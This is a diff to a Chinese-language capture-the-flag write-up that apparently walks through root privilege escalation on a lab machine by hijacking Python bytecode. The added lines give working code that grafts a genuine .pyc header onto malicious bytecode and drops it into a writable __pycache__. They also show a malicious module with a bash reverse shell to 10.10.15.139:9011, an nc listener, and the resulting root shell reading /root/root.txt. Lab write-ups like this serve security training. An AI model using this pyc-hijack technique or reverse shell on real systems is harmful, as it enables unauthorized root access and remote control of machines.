@@ -374,6 +374,25 @@ drwxrwxrwx 2 root root 4096 Apr  6 10:16 .
 drwxr-xr-x 4 root root 4096 Dec 11 07:54 ..
 -rw-r--r-- 1 root root 1880 Apr  6 10:16 extension_utils.cpython-312.pyc
 ```
+<details>
+<summary>如果extension_utils.cpython-312.pyc不存在就编译它</summary>
+
+```
+larry@browsed:/opt/extensiontool$ ls -la __pycache__/
+total 8
+drwxrwxrwx 2 root root 4096 Apr  6 11:10 .
+drwxr-xr-x 4 root root 4096 Dec 11 07:54 ..
+larry@browsed:/opt/extensiontool$ ls
+extensions  extension_tool.py  extension_utils.py  __pycache__
+larry@browsed:/opt/extensiontool$ python3 -m py_compile extension_utils.py
+larry@browsed:/opt/extensiontool$ ls -la __pycache__/
+total 12
+drwxrwxrwx 2 root  root  4096 Apr  6 11:19 .
+drwxr-xr-x 4 root  root  4096 Dec 11 07:54 ..
+-rw-rw-r-- 1 larry larry 1861 Apr  6 11:19 extension_utils.cpython-312.pyc
+```
+</details>
+
 #### 这一点意义重大，因为 Python 会将编译后的字节码（.pyc 文件）存储于此，当导入模块时这些字节码会自动被加载。此外，我们还可以注意到该脚本从本地模块 extension_utils 中导入了一些函数。
 ```
 larry@browsed:/opt/extensiontool$ cat extension_tool.py
@@ -452,7 +471,98 @@ def clean_temp_files(path):
 #### 我们通过编译此文件来生成一个 .pyc 文件。
 ```
 larry@browsed:/tmp$ python3 -m py_compile /tmp/evil_module.py
+larry@browsed:/tmp$ ls -la __pycache__
+total 12
+drwxrwxr-x  2 larry larry 4096 Apr  6 11:02 .
+drwxrwxrwt 14 root  root  4096 Apr  6 11:11 ..
+-rw-rw-r--  1 larry larry  466 Apr  6 11:02 evil_module.cpython-312.pyc
 ```
-#### 没有生成
 #### 然而，仅仅替换原始的.pyc 文件是不够的。Python 的.pyc 文件包含一个头部（前 16 个字节），其中包含诸如时间戳和版本信息等元数据。如果此头部不符合预期，该文件可能被忽略或拒绝。
 #### 为解决此问题，我们可以编写一个 Python 脚本，从合法的.pyc 文件中复制头部，并将其附加到我们的恶意字节码中。此外，由于我们没有对原始文件的写入权限，但对目录有写入权限，该脚本可以删除合法的头部。.将“pyc”替换为我们修改后的版本。
+```
+larry@browsed:/tmp$ vi create_header.py
+
+larry@browsed:/tmp$ cat create_header.py
+def transplant_header(good_pyc, evil_pyc, output_pyc):
+	with open(good_pyc, 'rb') as f:
+		good_header = f.read(16)
+
+	with open(evil_pyc, 'rb') as f:
+		evil_data = f.read()
+
+	new_pyc = good_header + evil_data[16:]
+	import os
+	os.system(f"rm {output_pyc}")
+	with open(output_pyc, 'wb') as f:
+		f.write(new_pyc)
+
+	print(f"[+] Transplanted header from {good_pyc} into {evil_pyc}, saved as {output_pyc}")
+
+transplant_header(
+	'/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc',
+	'/tmp/__pycache__/evil_module.cpython-312.pyc',
+	'/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc'
+)
+```
+#### 要先开侦听 
+```
+ [★]$ nc -lvnp 9011
+listening on [any] 9011 ...
+```
+#### 开了侦听 执行成功了 执行$ python3 create_header.py为什么要开侦听
+```
+当目标程序执行：import extension_utils
+才会触发写进去的：os.system("/bin/bash")
+或者你后面改成：bash -i >& /dev/tcp/10.10.15.139/9011 0>&1
+```
+#### 运行
+```
+larry@browsed:/tmp$ python3 create_header.py
+[+] Transplanted header from /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc into /tmp/__pycache__/evil_module.cpython-312.pyc, saved as /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc
+```
+#### 现在，再次执行这个具有特权的脚本。当脚本导入模块时，Python 会加载我们的恶意.pyc 文件而非原始文件，从而使我们的恶意代码以管理员权限执行。这就会产生一个根权限的 shell。
+```
+larry@browsed:/opt/extensiontool$ sudo -l
+Matching Defaults entries for larry on browsed:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User larry may run the following commands on browsed:
+    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
+larry@browsed:/opt/extensiontool$ sudo /opt/extensiontool/extension_tool.py
+[X] Use one of the following extensions : ['Fontify', 'Timer', 'ReplaceImages']
+larry@browsed:/opt/extensiontool$ sudo /opt/extensiontool/extension_tool.py --ext Fontify
+[+] Manifest is valid.
+[-] Skipping version bumping
+[-] Skipping packaging
+larry@browsed:/opt/extensiontool$ id
+uid=1000(larry) gid=1000(larry) groups=1000(larry)
+```
+#### 说呢 为什么要nc
+```
+larry@browsed:/tmp$ vi evil_module.py
+larry@browsed:/tmp$ cat evil_module.py
+def validate_manifest(path):
+	import os
+	os.system("/bin/bash")
+
+def clean_temp_files(path):
+	import os 
+	os.system("bash -i >& /dev/tcp/10.10.15.139/9011 0>&1")
+```
+```
+larry@browsed:/tmp$ python3 -m py_compile /tmp/evil_module.py
+```
+```
+larry@browsed:/opt/extensiontool$ python3 -m py_compile extension_utils.py
+```
+larry@browsed:/tmp$ python3 create_header.py
+[+] Transplanted header from /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc into /tmp/__pycache__/evil_module.cpython-312.pyc, saved as /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc
+```
+```
+larry@browsed:/tmp$ sudo  /opt/extensiontool/extension_tool.py --ext Fontify
+root@browsed:/tmp# id
+uid=0(root) gid=0(root) groups=0(root)
+root@browsed:/tmp# cat /root/root.txt
+```
